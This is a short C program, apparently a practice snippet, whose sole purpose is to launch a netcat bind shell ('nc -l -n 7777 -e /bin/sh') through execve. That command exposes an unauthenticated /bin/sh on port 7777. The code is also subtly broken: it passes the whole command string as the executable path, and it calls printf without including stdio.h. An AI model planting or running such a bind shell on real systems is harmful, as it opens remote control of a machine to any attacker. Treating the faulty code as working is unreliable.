/*  execve.c */

#include<unistd.h>

int main() {
  char *argv[] = {"/bin/nc -l -n 7777 -e /bin/sh",NULL};
  
  printf("calling with netcat");
  execve(argv[0],argv,NULL);
  
  sleep(100);
  return 0;
}
